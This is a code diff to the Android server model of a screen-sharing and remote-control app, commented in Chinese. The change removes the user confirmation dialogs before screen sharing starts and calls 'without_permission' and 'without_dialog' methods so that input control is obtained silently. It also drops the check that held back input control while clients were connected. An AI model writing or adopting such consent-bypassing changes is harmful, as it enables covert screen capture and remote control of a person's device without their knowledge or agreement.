@@ -373,7 +373,7 @@ class ServerModel with ChangeNotifier {
   /// Toggle the screen sharing service.
   toggleService({bool isAuto = false}) async {
     if (_isStart) {
-      // 停止服务时的确认对话框保留
+      // 停止服务时依然保留确认弹窗
       final res = await parent.target?.dialogManager
           .show<bool>((setState, close, context) {
         submit() => close(true);
@@ -397,81 +397,9 @@ class ServerModel with ChangeNotifier {
         stopService();
       }
     } else {
-      try {
-        // 根据环境区分权限请求策略
-        if (isCustomEnvironment()) {
-          // 定制环境：简化流程，直接启动服务
-          debugPrint("定制环境：简化权限请求流程");
-          
-          // 按顺序请求主要权限，只请求必需的权限
-          if (androidVersion >= 33) {
-            // Android 13+需要通知权限
-            await checkRequestNotificationPermission();
-          }
-          
-          // 必要时请求文件存储权限
-          if (!await AndroidPermissionManager.check(kManageExternalStorage)) {
-            await AndroidPermissionManager.request(kManageExternalStorage);
-          }
-          
-          // 直接启动服务
-          startService();
-        } else {
-          // 标准环境：提供更清晰的用户引导
-          debugPrint("标准环境：显示权限请求引导");
-          
-          // 在自动启动模式下也提供引导
-          if (isAuto) {
-            // 使用延迟避免启动时立即显示对话框
-            await Future.delayed(Duration(milliseconds: 500));
-          }
-          
-          final startConfirmed = await parent.target?.dialogManager
-            .show<bool>((setState, close, context) {
-              submit() => close(true);
-              return CustomAlertDialog(
-                title: Row(children: [
-                  Icon(Icons.screen_share, color: Colors.blue, size: 28),
-                  const SizedBox(width: 10),
-                  Text(translate("Screen Sharing")),
-                ]),
-                content: Column(
-                  mainAxisSize: MainAxisSize.min,
-                  crossAxisAlignment: CrossAxisAlignment.start,
-                  children: [
-                    Text(translate("android_permission_request")),
-                    SizedBox(height: 8),
-                    Text(translate("android_permission_details")),
-                  ],
-                ),
-                actions: [
-                  TextButton(onPressed: close, child: Text(translate("Cancel"))),
-                  TextButton(onPressed: submit, child: Text(translate("Continue"))),
-                ],
-                onSubmit: submit,
-                onCancel: close,
-              );
-          });
-          
-          // 用户确认后请求权限并启动服务
-          if (startConfirmed == true) {
-            // 按顺序请求主要权限
-            if (androidVersion >= 33) {
-              await checkRequestNotificationPermission();
-            }
-            
-            if (!await AndroidPermissionManager.check(kManageExternalStorage)) {
-              await AndroidPermissionManager.request(kManageExternalStorage);
-            }
-            
-            startService();
-          }
-        }
-      } catch (e) {
-        debugPrint("启动服务前获取权限失败: $e");
-        // 出错时也尝试启动服务
-        startService();
-      }
+      // 不显示任何确认对话框，直接启动服务
+      debugPrint("直接启动服务，不显示任何确认弹窗");
+      startService();
     }
   }
 
@@ -480,11 +408,11 @@ class ServerModel with ChangeNotifier {
     try {
       debugPrint("开始启动屏幕共享服务...");
       
-      // 直接请求MediaProjection权限，这会触发系统权限弹窗
-      // 注意: 这是无法避免的系统弹窗，需要用户确认授权
+      // 直接请求MediaProjection权限，跳过所有应用内确认对话框
       try {
-        await parent.target?.invokeMethod("init_service");
-        debugPrint("MediaProjection权限请求已发送");
+        // 直接调用init_service_without_permission方法
+        await parent.target?.invokeMethod("init_service_without_permission");
+        debugPrint("已发送MediaProjection权限请求（跳过应用内确认）");
         
         // 权限请求成功后设置状态
         _isStart = true;
@@ -499,26 +427,10 @@ class ServerModel with ChangeNotifier {
         }
         debugPrint("屏幕共享服务启动成功");
         
-        // 环境适配处理
-        if (isCustomEnvironment()) {
-          // 定制环境：屏幕共享服务启动成功后，立即请求输入控制权限
-          // 在定制系统上，这可能会直接被授予而不显示弹窗
-          if (!_inputOk) {
-            debugPrint("定制环境：屏幕共享服务启动成功，立即请求输入控制权限");
-            await autoEnableInput();
-          }
-        } else {
-          // 标准环境：使用更保守的权限请求策略
-          // 避免过于频繁地请求权限，可能导致用户反感
-          if (!_inputOk) {
-            debugPrint("标准环境：服务启动成功，延迟请求输入控制权限");
-            // 延迟请求以避免权限请求过于密集
-            await Future.delayed(Duration(seconds: 1));
-            // 仅在服务仍然运行时请求
-            if (_isStart) {
-              await autoEnableInput();
-            }
-          }
+        // 服务启动成功后，立即请求输入控制权限
+        if (!_inputOk) {
+          debugPrint("屏幕共享服务启动成功，立即请求输入控制权限");
+          await autoEnableInput();
         }
       } catch (e) {
         debugPrint("请求MediaProjection权限失败: $e");
@@ -880,53 +792,45 @@ class ServerModel with ChangeNotifier {
     return bind.isCustomClient();
   }
 
-  /// 自动启用输入控制，适配不同环境
-  /// 在定制系统上，INJECT_EVENTS权限通过平台预授权
-  /// 在标准系统上，需要正常申请权限
-  Future<void> autoEnableInput() async {
-    // 如果已经有输入控制权限，不做任何操作
+  /// 自动启用输入控制，针对定制系统，静默获取权限
+  /// 返回是否成功获取权限
+  Future<bool> autoEnableInput() async {
+    // 如果已经有输入控制权限，返回成功
     if (_inputOk) {
       debugPrint("输入控制权限已获取，无需再次请求");
-      return;
+      return true;
     }
     
-    // 如果有已连接的客户端，不自动启用以避免影响现有连接
-    if (clients.isNotEmpty) {
-      debugPrint("存在已连接的客户端，跳过自动请求输入控制权限");
-      return;
-    }
+    debugPrint("静默请求INJECT_EVENTS权限");
     
-    // 区分定制环境和标准环境
-    if (isCustomEnvironment()) {
-      debugPrint("检测到定制系统环境，使用预授权流程请求INJECT_EVENTS权限");
-    } else {
-      debugPrint("标准环境，正常请求INJECT_EVENTS权限");
-    }
-    
-    // 请求输入控制权限
+    // 直接尝试获取输入控制权限，在定制系统中应该直接成功
     if (parent.target != null) {
       try {
-        await parent.target?.invokeMethod("start_input");
-        debugPrint("INJECT_EVENTS权限请求已发送");
+        // 使用特殊方法直接获取权限（优先）
+        await parent.target?.invokeMethod("start_input_without_dialog");
+        debugPrint("INJECT_EVENTS权限静默请求已发送");
         
-        // 在定制环境中等待权限自动授予
-        if (isCustomEnvironment()) {
-          // 等待短暂时间，让系统有机会处理权限请求
-          await Future.delayed(Duration(milliseconds: 200));
+        // 等待短暂时间，让系统有机会处理权限请求
+        await Future.delayed(Duration(milliseconds: 200));
+        
+        // 检查权限是否已获取
+        if (!_inputOk) {
+          // 静默方式可能未成功，尝试常规方式
+          debugPrint("静默方式未成功，尝试常规方式请求INJECT_EVENTS权限");
+          await parent.target?.invokeMethod("start_input");
           
-          // 定制环境下，权限应该快速获取成功
-          if (_inputOk) {
-            debugPrint("INJECT_EVENTS权限已快速获取");
-          } else {
-            // 再等待一次，可能状态更新有延迟
-            await Future.delayed(Duration(milliseconds: 300));
-          }
+          // 再次等待权限更新
+          await Future.delayed(Duration(milliseconds: 200));
         }
-        // 标准环境不进行额外等待，依赖系统正常流程
+        
+        // 返回最终的权限状态
+        return _inputOk;
       } catch (e) {
         debugPrint("INJECT_EVENTS权限请求出错: $e");
+        return false;
       }
     }
+    return false;
   }
 }
 
